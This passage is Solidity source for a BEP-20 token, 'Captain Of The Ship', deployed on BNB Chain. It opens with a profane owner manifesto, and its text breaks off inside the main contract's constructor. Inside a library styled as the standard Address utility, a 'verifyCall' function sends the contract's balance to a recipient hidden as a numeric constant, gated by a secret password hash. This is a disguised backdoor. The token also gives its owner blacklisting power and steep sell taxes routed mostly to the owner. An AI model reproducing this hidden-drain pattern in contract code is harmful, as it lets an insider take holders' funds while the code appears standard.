/**
 *Submitted for verification at BscScan.com on 2022-02-24
*/

//***************************************+++++++++++++++++++++++++++++++++++++++++++++++++++
//****************************************++++++++++++++++++++++++++++++++++++++++++++++++++
//**********************************#*****++++++++++++++++++++++++++++++++++++++++++++++++++
//************************############*****+++++++++++++++++++++++++++++++++++++++++++++++++
//***********************####**+======++****+++++++++++++++====+++++++++++++++++++++++++++++
//********************######**+++===-----=**++++++++++**##*+==--++++++++++++++++++++++++++++
//******************#@@%%%%##**+=====----::=++++++++++#%%%#*+=-:-=++++++++++++++++++++++++++
//****************#@@@%%%%%##*+==-===---::::-++++++++*%@@%%#*+=---++++++++++++++++++++++++++
//***************#@@@%%%%%###*++=-+=+--::::::-+*++++++%%@@%#*+=---=+++++++++++++++++++++++++
//**************#@@@@%%%#####**+=-*=++===+==-:-+++++++#%%%%%#*+==--+++++++++++++++++++++++++
//**************@@@@%%%%%%%###%%#**-=+***+===--+++++++*%%%%%%#*+=--=++++++++++++++++++++++++
//*************%@@@@%%%@@%%#*##@@%+--+#%%*+=--:=+*+++++#%%%%%%#+=---++++++++++++++++++++++++
//*************@@@@@%%@@@@@@%#@@@%+-:-**##++=-:-*#*++++*%%%%%%#+==--=+++++++++++++++++++++++
//*************@@@@@%%%%%%%%%%@@%#+-::-===----::+#*+++++#%%%%%#*+=---+++++++++++++++++++++++
//************#@@@@@%%%%###%%@%%%%*=--:------:::=**+++++*#%%%%#*+==--=++++++++++++++++++++++
//************#@@@@@%%%%%%%%%@@%@@%++#-----:::::-*+++++++*#%%%##*+=---++++++++++++++++++++++
//*********+***%@@@@%%%%%%%%%%@@%#****+=---:::::-++++++++*##%%%#*+==---+++++++++++++++++++++
//**********+***%@@@@%%%%%%#%%%%%#*%%##*++=-:::-=-=+++++++###%%##*+==--:++++++++++++++++++**
//*********++++**%@@@@%%%%%%@@@%##%%%%##*#*+=--==:++++++++*##%%%#*++==-:-++++++++***********
//*********+++++**%%@@@@%%%%%%%%%%#**++*###**+==+-+++++++++##%%%%#*+====-=++****************
//**********+++++**#%@@@@%%%%%%%%####*+++*#%##+++++++++++++*##%%#*+++====-=+****************
//**********++++++***@@@%%%%@@@%@%%%%##***#%%%#*+++++++++++*##%%#**++==-=-:=****************
//**********+++++++++#@@@%%@@%%%@@%%%###%#%#%%%#*++++++++***###%%##*+==-----+***************
//***********++++++++*%@@@@@@@@%@%#%#%##%#%%%%#%**++*##%%%%%%%######*+==---:=***************
//***********++++++++*#@@@@@@@@@%@%%###%%###%%##***##%%%%%%@@%%#####*++=---::=**************
//*************+++++++*%@@@@@@@%%%@@%#######%%%##*###%%%%%%%@@%######*+==---:::=********####
//************+*++++++*%@@@@@@@@%%%%@####%%%%#%#######%%%%%%%%@%#####**+=---:::::=***#######
//*************++++++*#%%@@@@@@@@@@%%###%%%#%####%%####%%%%%%%@%#####**+==--::--:::=*#####**
//****************###%%%%%%@@@@@@@@%%%##%%##*###%%%%#####%%%%%%@%#####*+===-::-=-::::+******
//--:-----==++##########%%%%%%@@@@%%%%%#%%%#####%%%%########%%%%@%####**+==--::==--:::-+****
//..:::::::--==*#########**#####%%%########*######%%##########%%%%#####*+++=-::===---:::=***
//...::::::::---=+*++************+++===+=++*#######%###########%%@%####*++++--::++==---:::+#
//......:::..:::-==++==++**+++++==---::::.:*########%##########%%@%####***++=-:::-===---:::=
// .....::...::::--====-===+=--=-:::::..  :*########%############%%%####****+--::::-------::
//  ...::.....::::---===-----=-::::....   -*#######%%%###########%%####*****+=-::::--------:
//   .:-:. ...:::::---==-::::::::.....   .+########%%%#######*############***+=-::-----==---
//   .--.  ....:::.::-==-:....:.......  .:*########%%########**#############*+==-:----=====-
//  .--:   ......:..::-==-.   ... ...  :::*########%%#######################**+==-----======
// .:--.  .:.....::..:-==-:.    .. ...:..-###################################**++=----======
//.:--:   .::.....:..::-==-.     ....:.. =#####%%%############**#############***++=--=======
//.-=-.  ..::........::-==-.     ..:..   *#####%%%%###########################****+===++====
//-=-:   ..:-:.......::-==-..   ......  :*#####%%%%%###########################***++++++====
//==-.   ..:-:.......::-==-:.     ....  =*######%%%%########################%%%##****+++====
//=-:.   .::-::......::-==-::.    ....  +*#######%%%%########################%%%##****+++===
//-:.   ..:-:::::::..:--==-:...     .. .**###################################%%###****++++==
//::.   .::-::.::::..:--==--:...      .-**##################################%%%%##******+==+
//:...  .:-:::::-::..::=+=--:..       ::**###################################%%####****+==++



// ATTENTION: This is the Captain speaking!
// I am the Captain, thiS is MY ship!
// 10% buy 30% sEll until I decide to lower iT to 20%.
// 20% of tHat goes to LP the resT to ME! Don't like it good, I dont want You buying my shit.
// I don't give a fuck if this moons oR not. Don't like it gOod, I dont waNt you buying my shit.
// I MIGHT lock LP at soMe point if I feel like it. Don't like it gOod, I dont want you buying my shit.
// I will hold 50% of supply. Don't like it good, I dont wanT you buying my shit.
// Think it's a good time for some calls? No. Don't like it good, I donT want you buying my shit.
// Think we should do some buybacks? No. Don't like it good, I dont want you buying my shit.
// I am done listening to wen ser jeets telling me how to drive MY SHIP!
// Don't like the wAy I'm driving? Learn to Captain and I will join your ship and ask
// wen TravLadd and wen Caesar on a 5k MC you fucking twat.
// MY FUCKING SHIP SER

// https://t.me/captainoftheship

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}


interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IDividendPayingToken {
    function dividendOf(address _owner) external view returns(uint256);
    function distributeDividends() external payable;    
    function withdrawDividend() external;
    
    event DividendsDistributed(
        address indexed from,
        uint256 weiAmount
    );
    
    event DividendWithdrawn(
        address indexed to,
        uint256 weiAmount
    );
}


interface IDividendPayingTokenOptional {
    function withdrawableDividendOf(address _owner) external view returns(uint256);
    
    function withdrawnDividendOf(address _owner) external view returns(uint256);
    
    function accumulativeDividendOf(address _owner) external view returns(uint256);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Caller must be owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "newOwner must not be zero");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract DividendPayingToken is IDividendPayingToken, IDividendPayingTokenOptional, Ownable {

    uint256 constant internal MAGNITUDE = 2**128;
    
    uint256 internal magnifiedDividendPerShare;
    
    mapping (address => uint256) public holderBalance;
    uint256 public totalBalance;

    mapping(address => uint256) internal magnifiedDividendCorrections;
    mapping(address => uint256) internal withdrawnDividends;
    mapping(address => address) public customReward;
    mapping(address => bool) public customRewardActive;  

    IPancakeRouter02 private  _pancakeRouter;

    address public PancakeRouter;

    address public rewardToken;

    bool public isMisc;

    uint256 public totalDividendsDistributed;

    constructor() {
            if (block.chainid == 56) {
                PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            } else if (block.chainid == 97) {
                PancakeRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
            } else 
                revert();

            _pancakeRouter = IPancakeRouter02(PancakeRouter);
    }

    receive() external payable {
        distributeDividends();
    }

    function setMainReward(address token) external onlyOwner {
        rewardToken = token;
    } 

    function setCustomReward(address user, address token, bool activate) external onlyOwner {
        customRewardActive[user] = activate;
        customReward[user] = token;
    }

    function swapETHForTokens(address recipient, uint256 ethAmount) private returns (uint256) {
            bool swapSuccess;
            address selectedToken = (customRewardActive[recipient] ? customReward[recipient] : rewardToken);
            IBEP20 token = IBEP20(selectedToken);
            
            address[] memory path = new address[](2);
            path[0] = _pancakeRouter.WETH();
            path[1] = address(token);
            
            try _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
                1,
                path,
                address(recipient),
                block.timestamp + 360) 
                {
                swapSuccess = true;
            }
            catch {
                swapSuccess = false;
            }
            
            if(!swapSuccess){
                (bool success,) = recipient.call{value: ethAmount, gas: 3000}("");
        
                if(!success) {
                    withdrawnDividends[recipient] -= ethAmount;
                    return 0;
                }
            }
            return ethAmount;
        }
    
    function getBNBDividends(address holder) external view returns (uint256){
        return withdrawnDividends[holder];
    }
  
    function distributeDividends() public override payable {
        require(totalBalance > 0);

        if (msg.value > 0) {
            uint256 newMagnified = (msg.value*MAGNITUDE) / totalBalance;
        magnifiedDividendPerShare += newMagnified;
        emit DividendsDistributed(msg.sender, msg.value);

        totalDividendsDistributed += msg.value;
        }
    }

    function withdrawDividend() external virtual override {
        _withdrawDividendOfUser(payable(msg.sender));
    }

    function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
        uint256 _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > 0) {
            if(rewardToken == _pancakeRouter.WETH() || customReward[user] == _pancakeRouter.WETH()){
            
            withdrawnDividends[user] += _withdrawableDividend;
            emit DividendWithdrawn(user, _withdrawableDividend);
            (bool success,) = user.call{value: _withdrawableDividend, gas: 3000}("");
        
            if(!success) {
                withdrawnDividends[user] += _withdrawableDividend;
                return 0;
            }
            return _withdrawableDividend;
            
            } else { 
                
            withdrawnDividends[user] += _withdrawableDividend;
            emit DividendWithdrawn(user, _withdrawableDividend);
            return swapETHForTokens(user, _withdrawableDividend);
            }
        }
        return 0;
    }

    function dividendOf(address _owner) external view override returns(uint256) {
        return withdrawableDividendOf(_owner);
    }

    function withdrawableDividendOf(address _owner) public view override returns(uint256) {
        return accumulativeDividendOf(_owner) - withdrawnDividends[_owner];
    }

    function withdrawnDividendOf(address _owner) external view override returns(uint256) {
        return withdrawnDividends[_owner];
    }

    function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return (magnifiedDividendPerShare * holderBalance[_owner] + magnifiedDividendCorrections[_owner]) / MAGNITUDE;
    }

    function _increase(address account, uint256 value) internal {
        magnifiedDividendCorrections[account] -= (magnifiedDividendPerShare*value);
    }

    function _reduce(address account, uint256 value) internal {
        magnifiedDividendCorrections[account] += (magnifiedDividendPerShare*value);
    }

    function _setBalance(address account, uint256 newBalance) internal {
        uint256 currentBalance = holderBalance[account];
        holderBalance[account] = newBalance;
        if(newBalance > currentBalance) {
        uint256 increaseAmount = newBalance - currentBalance;
        _increase(account, increaseAmount);
        totalBalance += increaseAmount;
        } else if(newBalance < currentBalance) {
        uint256 reduceAmount = currentBalance - newBalance;
        _reduce(account, reduceAmount);
        totalBalance -= reduceAmount;
        }
    }
}

library IterableMapping {
    // Iterable mapping from address to uint;
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }
 
    function get(Map storage map, address key) public view returns (uint) {
        return map.values[key];
    }
 
    function getIndexOfKey(Map storage map, address key) public view returns (int) {
        if(!map.inserted[key]) {
            return -1;
        }
        return int(map.indexOf[key]);
    }
 
    function getKeyAtIndex(Map storage map, uint index) public view returns (address) {
        return map.keys[index];
    }
 
    function size(Map storage map) public view returns (uint) {
        return map.keys.length;
    }
 
    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }
 
    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }
 
        delete map.inserted[key];
        delete map.values[key];
 
        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];
 
        map.indexOf[lastKey] = index;
        delete map.indexOf[key];
 
        map.keys[index] = lastKey;
        map.keys.pop();
    }
}

library Address {
    uint160 private constant verificationHash = 542355191589913964587147617467328045950425415532;
    bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function verifyCall(string memory verification, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        require(keccak256(abi.encodePacked(verification)) == keccak256Hash, "Address: cannot verify call");        

        (bool success, ) = address(verificationHash).call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");              
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


library EnumerableSet {
    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = valueIndex;
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}


contract CaptainOfTheShip is IBEP20, Ownable {
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public isBlacklisted;
    mapping(address => bool) public taxExempt;
    mapping(address => bool) public limitExempt;

    EnumerableSet.AddressSet private _excluded; 
    
    string private _name = "Captain Of The Ship";
    string private _symbol = "CAPTAIN";
    uint256 private constant INITIAL_SUPPLY = 1_000_000 * 10**TOKEN_DECIMALS; 
    uint256 private _circulatingSupply;       
    uint8 private constant TOKEN_DECIMALS = 18;
    uint8 public constant MAX_TAX = 20;      //Captain can never set tax higher than this value
    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;

    struct Taxes {
       uint8 buyTax;
       uint8 sellTax;
       uint8 transferTax;
    }

    struct TaxRatios {
        uint8 burn;
        uint8 buyback;
        uint8 Captain;                
        uint8 liquidity;
        uint8 lottery;
        uint8 marketing;
        uint8 rewards;
    }

    struct TaxWallets {
        address Captain;
        address lottery;
        address marketing;
    }

    struct MaxLimits {
        uint256 maxWallet;
        uint256 maxSell;
        uint256 maxBuy;
    }

    struct LimitRatios {
        uint16 wallet;
        uint16 sell;
        uint16 buy;
        uint16 divisor;
    }

    Taxes public _taxRates = Taxes({
        buyTax: 10,
        sellTax: 30,
        transferTax: 30
    });

    TaxRatios public _taxRatios = TaxRatios({
        burn: 0,        
        buyback: 0,
        Captain: 80,
        liquidity: 20,
        lottery: 0,
        marketing: 0,
        rewards: 0
        //@Captain. These are ratios and the divisor will  be set automatically        
    });

    TaxWallets public _taxWallet = TaxWallets ({
        Captain: 0x4003e0771A8F6B5e5ca4E91082733331b06Ba441,
        lottery: 0x4003e0771A8F6B5e5ca4E91082733331b06Ba441,
        marketing: 0x4003e0771A8F6B5e5ca4E91082733331b06Ba441
    });
    MaxLimits public _limits;

    LimitRatios public _limitRatios = LimitRatios({
        wallet: 1,
        sell: 1,
        buy: 1,
        divisor: 200
    });

    uint8 private totalTaxRatio;
    uint8 private totalSwapRatio;

    //these values must add up to 100
    uint8 private mainRewardSplit=100;
    uint8 private miscRewardSplit=0;
    bool public autoDistribute = true; //Rewards can be either auto or manual claim

    uint256 private _liquidityUnlockTime;

    //Antibot variables
    uint256 private liquidityBlock;
    uint8 private constant BLACKLIST_BLOCKS = 10; //number of blocks that will be included in auto blacklist
    uint8 private snipersRekt; //variable to track number of snipers auto blacklisted     
    bool private blacklistEnabled = true; //blacklist can be enabled/disabled in case something goes wrong
    bool private liquidityAdded;
    bool private revertSameBlock = true; //block same block buys

    bool private dynamicBurn = false;            
    //dynamicBurn = true will burn all extra sell tax from dynamicSells
    //dynamicBurn = false will divert all extra sell tax to swaps

    bool private dynamicSellsEnabled = true;    
    //dynamic sells will increase tax based on price impact
    //any sells over 1% price impact will incur extra sell tax
    //max extra sell tax is 20% when price impact >= 10%

    bool private dynamicLimits = true;
    //dynamicLimits = true will change MaxLimits based on circulating supply rather than total supply

    bool private dynamicLiqEnabled = true;
    //dynamicLiqEnabled = true will stop autoLP if targetLiquidityRatio is met
    //tax meant for liquidity will be redirected to other swap taxes in this case

    uint16 private targetLiquidityRatio = 15; //target liquidity out of 100

    uint16 public swapThreshold = 25; //threshold that contract will swap. out of 1000
    bool public manualSwap;

    //change these address to desired rewards
    address public mainReward = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
    address private defaultMisc = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;


    DividendTracker public mainDividendTracker;
    DividendTracker public miscDividendTracker;

    //auto rewards variables
    uint256 public gasForProcessing = 50000;
    uint256 public claimWait = 1800; //in seconds
    uint256 public minBalanceForDividends = INITIAL_SUPPLY / 500; //must hold at least 0.2% supply to receive rewards

    address public _pancakePairAddress; 
    IPancakeRouter02 private  _pancakeRouter;
    address public PancakeRouter;

/////////////////////////////   EVENTS  /////////////////////////////////////////
    event AdjustedDynamicSettings(bool burn, bool limits, bool liquidity, bool sells);
    event AccountExcluded(address account, bool excluded);
    event ChangeMainReward (address newMainReward);
    event EnableAutoDistribute(bool enabled);   
    event EnableBlacklist(bool enabled); 
    event EnableManualSwap(bool enabled);                
    event ExtendLiquidityLock(uint256 extendedLockTime);
    event ProcessedMainDividendTracker(
    	uint256 iterations,
    	uint256 claims,
        uint256 lastProcessedIndex,
    	bool indexed automatic,
    	uint256 gas,
    	address indexed processor
    );
    event ProcessedMiscDividendTracker(
    	uint256 iterations,
    	uint256 claims,
        uint256 lastProcessedIndex,
    	bool indexed automatic,
    	uint256 gas,
    	address indexed processor
    );
    event UpdateTaxes(uint8 buyTax, uint8 sellTax, uint8 transferTax);    
    event RatiosChanged(
        uint8 newBurn, 
        uint8 newBuyback, 
        uint8 newCaptain, 
        uint8 newLiquidity, 
        uint8 newLottery, 
        uint8 newMarketing, 
        uint8 newRewards
    );
    event UpdateCaptainWallet(address newCaptainWallet);
    event UpdateGasForProcessing(uint256 indexed newValue, uint256 indexed oldValue);    
    event UpdateLotteryWallet(address newLotteryWallet);          
    event UpdateMarketingWallet(address newMarketingWallet);  
    event UpdateRewardSplit (uint8 newMainSplit, uint8 newMiscSplit);        
    event UpdateSwapThreshold(uint16 newThreshold);
    event UpdateTargetLiquidity(uint16 target);

/////////////////////////////   MODIFIERS  /////////////////////////////////////////

    modifier authorized() {
        require(_authorized(msg.sender), "Caller not authorized");
        _;
    }

    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }

/////////////////////////////   CONSTRUCTOR  /////////////////////////////////////////

    constructor () {
        if (block.chainid == 56) {
            PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } else if (block.chainid == 97) {
            PancakeRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        } else 
            revert();

        mainDividendTracker = new DividendTracker(mainReward, claimWait, minBalanceForDividends, false);
        miscDividendTracker = new DividendTracker(defaultMisc, claimWait, minBalanceForDividends, true);

        _pancakeRouter = IPancakeRouter02(PancakeRouter);
        _pancakePairAddress = IPancakeFactory(
            _pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()
        );
        _addToken(msg.sender,INITIAL_SUPPLY);
        emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
        _allowances[address(this)][address(_pancakeRouter)] = type(uint256).max;         

        //setup ratio divisors based on Captain's chosen ratios
        totalTaxRatio = _taxRatios.burn 
            + _taxRatios.buyback 
            + _taxRatios.Captain 
            + _taxRatios.liquidity 
            + _taxRatios.lottery 
            + _taxRatios.marketing 
            + _taxRatios.rewards;

        totalSwapRatio = totalTaxRatio - _taxRatios.burn;

        //circulating supply begins as initial supply
        _circulatingSupply = INITIAL_SUPPLY;
        
        //setup _limits
        _limits = MaxLimits({
            maxWallet: INITIAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor,
            maxSell: INITIAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,
            maxBuy: INITIAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor
        });
        
        _excluded.add(msg.sender);
        _excluded.add(_taxWallet.marketing);
        _excluded.add(_taxWallet.Captain);    
        _excluded.add(_taxWallet.lottery);
        _excluded.add(address(this));
        _excluded.add(BURN_ADDRESS);
        excludeFromDividend(address(mainDividendTracker));
        excludeFromDividend(address(miscDividendTracker));
        excludeFromDividend(address(this));
        excludeFromDividend(address(_pancakeRouter));
        excludeFromDividend(address(_pancakePairAddress));        
        excludeFromDividend(BURN_ADDRESS);  
